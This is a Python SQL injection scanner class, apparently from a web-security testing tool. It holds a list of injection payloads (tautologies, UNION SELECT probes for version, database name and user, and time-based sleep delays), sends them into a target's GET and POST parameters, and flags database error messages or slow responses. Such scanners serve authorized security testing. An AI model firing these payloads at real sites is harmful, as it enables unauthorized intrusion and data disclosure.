import re
import time
import json
from urllib.parse import urljoin, urlparse
from colorama import Fore, Style

class SQLInjectionScanner:
    def __init__(self):
        self.name = "SQL Injection Scanner"
        self.version = "2.1"
        self.payloads = self.load_payloads()
        self.vulnerable_params = []
        
    def load_payloads(self):
        """Load SQL injection payloads"""
        return [
            "'",
            "\"",
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' UNION SELECT NULL --",
            "' UNION SELECT NULL, NULL --",
            "' AND 1=1 --",
            "' AND 1=2 --",
            "' OR 1=1 --",
            "' OR 1=1; --",
            "' OR 'a'='a",
            "' OR 1 --",
            "' OR 1=1 #",
            "' OR 1=1/*",
            "admin' --",
            "admin' #",
            "admin'/*",
            "' OR '1'='1' /*",
            "' OR '1'='1' #",
            "\" OR \"1\"=\"1",
            "\" OR \"1\"=\"1\" --",
            "' OR 'x'='x",
            "1' ORDER BY 1--",
            "1' ORDER BY 2--",
            "1' ORDER BY 3--",
            "1' ORDER BY 999--",
            "' GROUP BY columnnames having 1=1 --",
            "-1' UNION SELECT 1,2,3--",
            "' UNION SELECT 1,@@version,3,4,5--",
            "' UNION SELECT 1,database(),3,4,5--",
            "' UNION SELECT 1,user(),3,4,5--",
            "' AND SLEEP(5) --",
            "' AND BENCHMARK(1000000,MD5('A')) --",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
            "' OR (SELECT 1 FROM (SELECT SLEEP(5))a) --",
            "' WAITFOR DELAY '00:00:05' --",
            ";WAITFOR DELAY '00:00:05' --",
            "' OR pg_sleep(5) --",
            "' OR (SELECT 1 FROM (SELECT pg_sleep(5))a) --",
            "' OR (SELECT 1 FROM (SELECT SLEEP(5))a) OR '",
            "' AND (SELECT 1 FROM (SELECT SLEEP(5))a) --",
            "' AND IF(1=1, SLEEP(5), 0) --",
            "' AND IF(1=2, SLEEP(5), 0) --",
            "' AND ELT(1=1, SLEEP(5)) --"
        ]
    
    def scan(self, target, options=None):
        """Scan for SQL injection vulnerabilities"""
        from utils.request_wrapper import RequestWrapper
        
        results = {
            'vulnerabilities': [],
            'tested_urls': 0,
            'timestamp': time.time()
        }
        
        try:
            req = RequestWrapper()
            
            # Test URL parameters
            parsed_url = urlparse(target)
            query_params = {}
            if parsed_url.query:
                from urllib.parse import parse_qs
                query_params = parse_qs(parsed_url.query)
                
                for param in query_params:
                    original_value = query_params[param][0]
                    
                    for payload in self.payloads[:10]:  # Test first 10 payloads
                        test_params = query_params.copy()
                        test_params[param] = payload
                        
                        # Reconstruct URL with payload
                        test_url = parsed_url._replace(query=None).geturl()
                        
                        # Test with GET
                        response = req.get(test_url, params=test_params)
                        
                        if self.detect_sql_injection(response):
                            vuln = {
                                'type': 'SQL Injection',
                                'parameter': param,
                                'payload': payload,
                                'url': response.url,
                                'method': 'GET',
                                'evidence': self.extract_evidence(response)
                            }
                            results['vulnerabilities'].append(vuln)
                            print(f"{Fore.RED}[!] SQLi found in GET param: {param}")
                            break
                        
                        # Test with POST
                        response = req.post(test_url, data=test_params)
                        if self.detect_sql_injection(response):
                            vuln = {
                                'type': 'SQL Injection',
                                'parameter': param,
                                'payload': payload,
                                'url': test_url,
                                'method': 'POST',
                                'evidence': self.extract_evidence(response)
                            }
                            results['vulnerabilities'].append(vuln)
                            print(f"{Fore.RED}[!] SQLi found in POST param: {param}")
                            break
                        
                        results['tested_urls'] += 1
                        time.sleep(0.1)  # Rate limiting
            
            return results
            
        except Exception as e:
            print(f"{Fore.RED}[-] SQL Injection scan error: {e}")
            return results
    
    def detect_sql_injection(self, response):
        """Detect SQL injection in response"""
        error_patterns = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"PostgreSQL.*ERROR",
            r"Warning.*\Wpg_.*",
            r"PostgreSQL.*ERROR",
            r"ORA-[0-9]{5}",
            r"Oracle error",
            r"Oracle.*Driver",
            r"SQLite/JDBCDriver",
            r"SQLite.Exception",
            r"System.Data.SQLite.SQLiteException",
            r"Warning.*sqlite_.*",
            r"Microsoft Access Driver",
            r"Access Database Engine",
            r"Microsoft JET Database Engine",
            r"SQL Server.*Driver",
            r"SQLServer JDBC Driver",
            r"Unclosed quotation mark",
            r"Microsoft OLE DB Provider",
            r"Incorrect syntax near"
        ]
        
        response_text = response.text if hasattr(response, 'text') else str(response)
        
        for pattern in error_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        
        # Check for time-based delays
        if response.elapsed.total_seconds() > 5:
            return True
            
        return False
    
    def extract_evidence(self, response):
        """Extract evidence from response"""
        evidence = {
            'status_code': response.status_code,
            'response_time': response.elapsed.total_seconds(),
            'content_length': len(response.content)
        }
        
        # Extract error messages
        error_patterns = [
            r"SQL.*error.*",
            r"syntax.*error.*",
            r"mysql.*error.*"
        ]
        
        for pattern in error_patterns:
            matches = re.findall(pattern, response.text, re.IGNORECASE)
            if matches:
                evidence['error_messages'] = matches[:3]  # Limit to 3 matches
                break
        
        return evidence